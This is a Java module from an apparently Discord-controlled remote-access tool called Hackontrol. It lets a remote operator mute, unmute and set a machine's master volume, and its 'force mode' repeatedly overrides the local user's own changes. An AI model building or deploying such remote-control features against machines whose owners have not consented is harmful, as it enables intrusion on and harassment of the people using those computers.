package com.khopan.hackontrol.module;

import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;

import com.khopan.hackontrol.NativeLibrary;
import com.khopan.hackontrol.manager.interaction.ButtonContext;
import com.khopan.hackontrol.manager.interaction.ButtonManager;
import com.khopan.hackontrol.manager.interaction.ButtonManager.ButtonType;
import com.khopan.hackontrol.manager.interaction.InteractionManager;
import com.khopan.hackontrol.manager.interaction.ModalContext;
import com.khopan.hackontrol.manager.interaction.Question;
import com.khopan.hackontrol.manager.interaction.Question.QuestionType;
import com.khopan.hackontrol.registry.Registry;
import com.khopan.hackontrol.utils.HackontrolError;
import com.khopan.hackontrol.utils.HackontrolMessage;

import net.dv8tion.jda.api.interactions.components.ActionRow;
import net.dv8tion.jda.api.interactions.components.buttons.Button;
import net.dv8tion.jda.api.interactions.components.text.TextInput;
import net.dv8tion.jda.api.interactions.components.text.TextInputStyle;
import net.dv8tion.jda.api.interactions.modals.Modal;
import net.dv8tion.jda.api.interactions.modals.ModalMapping;

public class AudioModule extends Module {
	private static final String MODULE_NAME = "audio";

	private static final Button BUTTON_MUTE          = ButtonManager.staticButton(ButtonType.SUCCESS, "Mute", "muteMaster");
	private static final Button BUTTON_UNMUTE        = ButtonManager.staticButton(ButtonType.DANGER, "Unmute", "unmuteMaster");

	private static final Button BUTTON_CHANGE_VOLUME = ButtonManager.staticButton(ButtonType.SUCCESS, "Change Volume", "changeVolumeMaster");

	private static final Button BUTTON_ENABLE_FORCE  = ButtonManager.staticButton(ButtonType.SUCCESS, "Enable", "enableForceModeMaster");
	private static final Button BUTTON_DISABLE_FORCE = ButtonManager.staticButton(ButtonType.DANGER, "Disable", "disableForceModeMaster");

	private static final String MODAL_CHANGE_VOLUME = "changeVolume";

	private volatile float volume;
	private volatile boolean mute;
	private volatile boolean forceMode;

	@Override
	public String getName() {
		return AudioModule.MODULE_NAME;
	}

	@Override
	public void preInitialize(Registry registry) {
		registry.register(InteractionManager.BUTTON_REGISTRY, AudioModule.BUTTON_MUTE,          context -> this.buttonMute(context, true));
		registry.register(InteractionManager.BUTTON_REGISTRY, AudioModule.BUTTON_UNMUTE,        context -> this.buttonMute(context, false));
		registry.register(InteractionManager.BUTTON_REGISTRY, AudioModule.BUTTON_CHANGE_VOLUME, this :: buttonChangeVolume);
		registry.register(InteractionManager.BUTTON_REGISTRY, AudioModule.BUTTON_ENABLE_FORCE,  context -> this.buttonForceMode(context, true));
		registry.register(InteractionManager.BUTTON_REGISTRY, AudioModule.BUTTON_DISABLE_FORCE, context -> this.buttonForceMode(context, false));
		registry.register(InteractionManager.MODAL_REGISTRY,  AudioModule.MODAL_CHANGE_VOLUME,  this :: modalChangeVolume);
	}

	@Override
	public void initialize() {
		this.channel.sendMessageComponents(ActionRow.of(AudioModule.BUTTON_MUTE, AudioModule.BUTTON_UNMUTE), ActionRow.of(AudioModule.BUTTON_CHANGE_VOLUME)).queue();
		this.channel.sendMessage("**Force Mode**").addActionRow(AudioModule.BUTTON_ENABLE_FORCE, AudioModule.BUTTON_DISABLE_FORCE).queue();
	}

	@Override
	public void postInitialize() {
		Executors.newSingleThreadScheduledExecutor().scheduleAtFixedRate(this :: tick, 0, 1000 / 60, TimeUnit.MILLISECONDS);
	}

	private void tick() {
		if(!this.forceMode) {
			return;
		}

		if(NativeLibrary.volume() != this.volume) {
			NativeLibrary.volume(this.volume);
		}

		if(NativeLibrary.mute() != this.mute) {
			NativeLibrary.mute(this.mute);
		}
	}

	private void buttonMute(ButtonContext context, boolean mute) {
		if((this.forceMode ? this.mute : NativeLibrary.mute()) == mute) {
			HackontrolMessage.boldDeletable(context.reply(), "Master volume is already " + (mute ? "muted" : "unmuted"));
			return;
		}

		if(!mute) {
			Question.positive(context.reply(), "Are you sure you want to unmute?", QuestionType.YES_NO, () -> {
				if(this.forceMode) {
					this.mute = false;
				} else {
					NativeLibrary.mute(false);
				}
			});

			return;
		}

		if(this.forceMode) {
			this.mute = true;
		} else {
			NativeLibrary.mute(true);
		}

		context.deferEdit().queue();
	}

	private void buttonChangeVolume(ButtonContext context) {
		float volume = this.forceMode ? this.volume : NativeLibrary.volume();
		String volumeLevel = Integer.toString(Math.min(Math.max((int) Math.round(((double) volume) * 100.0d), 0), 100));
		TextInput textInput = TextInput.create("volume", "Volume", TextInputStyle.SHORT)
				.setRequired(true)
				.setMinLength(1)
				.setMaxLength(3)
				.setPlaceholder("0 - 100")
				.setValue(volumeLevel)
				.build();

		Modal modal = Modal.create(AudioModule.MODAL_CHANGE_VOLUME, "Change Volume")
				.addActionRow(textInput)
				.build();

		context.replyModal(modal).queue();
	}

	private void buttonForceMode(ButtonContext context, boolean enable) {
		if(this.forceMode == enable) {
			HackontrolMessage.boldDeletable(context.reply(), "Force mode is already " + (enable ? "enabled" : "disabled"));
			return;
		}

		if(!enable) {
			Question.positive(context.reply(), "Are you sure you want to disable force mode?", QuestionType.YES_NO, () -> this.forceMode = false);
			return;
		}

		this.volume = NativeLibrary.volume();
		this.mute = NativeLibrary.mute();
		this.forceMode = true;
		context.deferEdit().queue();
	}

	private void modalChangeVolume(ModalContext context) {
		ModalMapping mapping = context.getValue("volume");

		if(mapping == null) {
			HackontrolError.message(context.reply(), "Volume cannot be null");
			return;
		}

		String text = mapping.getAsString();
		int volumeLevel;

		try {
			volumeLevel = Integer.parseInt(text);
		} catch(Throwable Errors) {
			HackontrolError.message(context.reply(), "Invalid number format");
			return;
		}

		if(volumeLevel < 0 || volumeLevel > 100) {
			HackontrolError.message(context.reply(), "Volume out of bounds, expected 0 - 100");
			return;
		}

		float volume = ((float) volumeLevel) / 100.0f;

		if(this.forceMode) {
			this.volume = volume;
		} else {
			NativeLibrary.volume(volume);
		}

		context.deferEdit().queue();
	}
}
